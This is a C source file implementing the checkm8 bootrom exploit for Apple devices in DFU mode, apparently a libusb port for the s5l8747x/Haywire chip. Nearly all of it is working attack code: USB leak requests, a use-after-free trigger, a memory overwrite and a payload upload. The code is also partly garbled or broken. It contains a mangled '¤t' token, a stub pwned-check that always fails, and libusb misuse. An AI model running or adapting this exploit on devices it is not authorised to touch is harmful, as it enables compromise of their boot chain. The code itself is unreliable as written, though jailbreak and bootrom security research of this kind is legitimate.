/* 
 * this is pretty much a direct rewrite
 * of original checkm8 implementation from ipwndfu
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <libusb-1.0/libusb.h>

#include "config.h"

#define PWND_STR    "PWND:["
#define NONCE_MAX_SIZE  20

const uint16_t DFU_VID = 0x05AC;
const uint16_t DFU_PID = 0x1227;

uint8_t current_nonce[NONCE_MAX_SIZE] = { 0 };
uint8_t empty[0x800] = { 0 };

static void usb_req_no_leak(libusb_device_handle *device) {
    libusb_control_transfer(device, 0x80, 6, 0x304, 0x40A, empty, 0x41, 1);
}

static void usb_req_leak(libusb_device_handle *device) {
    libusb_control_transfer(device, 0x80, 6, 0x304, 0x40A, empty, 0x40, 1);
}

static void usb_req_stall(libusb_device_handle *device) {
    libusb_control_transfer(device, 0x2, 3, 0x0, 0x80, empty, 0x0, 10);
}

static void usb_reset(libusb_device_handle *device) {
    libusb_reset_device(device);
}

static bool check_device_pwnd(libusb_device_handle* client) {
    return 0;//TBD
}

static void close_device(libusb_device_handle *device) {
    libusb_close(device);
	libusb_exit(NULL);
}

libusb_device_handle* acquire_device(uint16_t vid, uint16_t pid, unsigned int timeout_ms) {
    libusb_device_handle *handle = NULL;
    struct timespec start, current;
    double elapsed = 0.0;

    // 获取开始时间
    clock_gettime(CLOCK_MONOTONIC, &start);

    // 在超时时间内循环尝试查找设备
    while (elapsed < timeout_ms / 1000.0) {
        // 尝试查找并打开设备
        handle = find_device_by_vid_pid(vid, pid);
        
        // 如果找到设备，返回句柄
        if (handle != NULL) {
            printf("Device acquired successfully (VID:0x%04x PID:0x%04x)\n", vid, pid);
            return handle;
        }

        // 计算已用时间
        clock_gettime(CLOCK_MONOTONIC, ¤t);
        elapsed = (current.tv_sec - start.tv_sec) + 
                 (current.tv_nsec - start.tv_nsec) / 1e9;

        // 短暂休眠，避免过度占用 CPU
        usleep(10000);  // 休眠 10ms
    }

    // 超时未找到设备
    fprintf(stderr, "Failed to acquire device (VID:0x%04x PID:0x%04x) within %u ms\n", 
            vid, pid, timeout_ms);
    return NULL;
}

// 异步传输完成回调函数
static void LIBUSB_CALL async_transfer_callback(struct libusb_transfer *transfer) {
    // 在这个简单的实现中，我们不需要处理回调
    // 可以留空或添加日志
}

// 执行异步控制传输
int libusb1_async_ctrl_transfer(
    libusb_device_handle *device,
    uint8_t bmRequestType,
    uint8_t bRequest,
    uint16_t wValue,
    uint16_t wIndex,
    unsigned char *data,
    uint16_t data_length,
    unsigned int timeout)
{
    struct libusb_transfer *transfer = NULL;
    unsigned char *buffer = NULL;
    int result;
    struct timespec start, current;
    double elapsed;

    // 分配传输结构体
    transfer = libusb_alloc_transfer(0);
    if (!transfer) {
        fprintf(stderr, "Failed to allocate transfer\n");
        return -1;
    }

    // 准备控制传输的 setup packet 和数据
    int total_length = LIBUSB_CONTROL_SETUP_SIZE + data_length;
    buffer = (unsigned char *)malloc(total_length);
    if (!buffer) {
        libusb_free_transfer(transfer);
        fprintf(stderr, "Failed to allocate buffer\n");
        return -1;
    }

    // 填充 setup packet
    libusb_fill_control_setup(buffer, bmRequestType, bRequest, wValue, wIndex, data_length);
    // 复制数据
    if (data_length > 0 && data != NULL) {
        memcpy(buffer + LIBUSB_CONTROL_SETUP_SIZE, data, data_length);
    }

    // 设置传输参数
    libusb_fill_control_transfer(
        transfer,
        device,
        buffer,
        async_transfer_callback,
        NULL,  // user_data
        timeout
    );

    // 提交异步传输
    result = libusb_submit_transfer(transfer);
    if (result != LIBUSB_SUCCESS) {
        fprintf(stderr, "Failed to submit transfer: %s\n", libusb_error_name(result));
        free(buffer);
        libusb_free_transfer(transfer);
        return result;
    }

    // 获取开始时间
    clock_gettime(CLOCK_MONOTONIC, &start);

    // 等待指定的超时时间
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current);
        elapsed = (current.tv_sec - start.tv_sec) + 
                 (current.tv_nsec - start.tv_nsec) / 1e9;
        
        if (elapsed >= timeout / 1000.0) {
            break;
        }
        // 这里可以添加上下文处理，但为了简单起见我们只是等待
    }

    // 取消传输
    result = libusb_cancel_transfer(transfer);
    if (result != LIBUSB_SUCCESS) {
        fprintf(stderr, "Failed to cancel transfer: %s\n", libusb_error_name(result));
    }

    // 清理资源
    free(buffer);
    libusb_free_transfer(transfer);

    return 0;
}

libusb_device_handle* find_device_by_vid_pid(uint16_t vid, uint16_t pid) {
    libusb_context *context = NULL;
    libusb_device **device_list = NULL;
    libusb_device_handle *handle = NULL;
    ssize_t device_count = 0;
    int result;

    // 初始化 libusb
    result = libusb_init(&context);
    if (result < 0) {
        fprintf(stderr, "Failed to initialize libusb: %s\n", libusb_error_name(result));
        return NULL;
    }

    // 获取设备列表
    device_count = libusb_get_device_list(context, &device_list);
    if (device_count < 0) {
        fprintf(stderr, "Failed to get device list: %s\n", libusb_error_name(device_count));
        libusb_exit(context);
        return NULL;
    }

    // 遍历设备列表
    for (ssize_t i = 0; i < device_count; i++) {
        libusb_device *device = device_list[i];
        struct libusb_device_descriptor desc;

        // 获取设备描述符
        result = libusb_get_device_descriptor(device, &desc);
        if (result < 0) {
            continue;
        }

        // 检查 VID 和 PID 是否匹配
        if (desc.idVendor == vid && desc.idProduct == pid) {
            // 尝试打开设备
            result = libusb_open(device, &handle);
            if (result < 0) {
                fprintf(stderr, "Failed to open device: %s\n", libusb_error_name(result));
                handle = NULL;
            }
            break;  // 找到设备后退出循环
        }
    }

    // 清理资源
    libusb_free_device_list(device_list, 1);
    libusb_exit(context);

    return handle;
}

int checkm8(libusb_device_handle* device, const exploit_config_t *config) {
    printf("leaking...\n");

    usb_req_stall(device);
    for (int i = 0; i < config->large_leak; i++) {
        usb_req_leak(device);
    }
    usb_req_no_leak(device);

    usb_reset(device);
    close_device(device);

    device = acquire_device(DFU_VID, DFU_PID, 1000);
    if (!device) {
        printf("device disappeared after leak stage\n");
        return -1;
    }

    printf("triggering UaF...\n");

    int sent = libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
    libusb_control_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
    close_device(device);

    usleep(250 * 1000);

    device = acquire_device(DFU_VID, DFU_PID, 1000);
    if (!device) {
        printf("device disappeared after UaF trigger stage\n");
        return -1;
    }

    printf("sending payload...\n");

    usb_req_stall(device);
    usb_req_leak(device);

    size_t overwrite_size = config->overwrite_size - sent;
    off_t overwrite_addr_ptr = overwrite_size;
    overwrite_size += 4;

    if (config->needs_overwrite_suffix) {
        overwrite_size += 4;
    }

    uint8_t overwrite[overwrite_size];
    memset(overwrite, 0x0, sizeof(overwrite));
    *(uint32_t *)((uint8_t *)&overwrite + overwrite_addr_ptr) = config->overwrite_addr;

    libusb_control_transfer(device, 0, 0, 0, 0, overwrite, overwrite_size, 100);
    libusb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)config->payload, config->payload_len, 100);

    usb_reset(device);
    close_device(device);

    device = acquire_device(DFU_VID, DFU_PID, 1000);
    if (!device) {
        printf("device disappeared after sending payload\n");
        return -1;
    }

    if (!check_device_pwnd(device)) {
        printf("device returned to DFU, but no PWND in serial number\n");
        close_device(device);
        return -1;
    }

    close_device(device);

    return 0;
}

static void print_banner() {
    printf("***          checkm8 exploit by @axi0mX           ***\n");
    printf("*** s5l8747x/Haywire implementation by @a1exdandy ***\n");
    printf("***     libirecovery/iOS port by @nyan_satan      ***\n");
    printf("\n");
}

int main(void) {
    print_banner();

    const exploit_config_t *config = get_config(0x8747);

    libusb_device_handle *device = find_device_by_vid_pid(DFU_VID, DFU_PID);
    if (!device) {
        printf("dfu device not found!\n");
        return -1;
    }

    if (check_device_pwnd(device)) {
        printf("device already pwned\n");
        return -1;
    }

    struct timeval st, et;
    gettimeofday(&st, NULL);

    if (checkm8(device, config) != 0) {
        printf("exploit failed\n");
        return -1;
    }

    gettimeofday(&et, NULL);
    long elapsed = ((et.tv_sec - st.tv_sec) * 1000000) + (et.tv_usec - st.tv_usec);
    float elapsed_sec = (float)elapsed / (1000 * 1000);

    printf("exploit success!\n");
    printf("took - %.2fs\n", elapsed_sec);

    return 0;
}
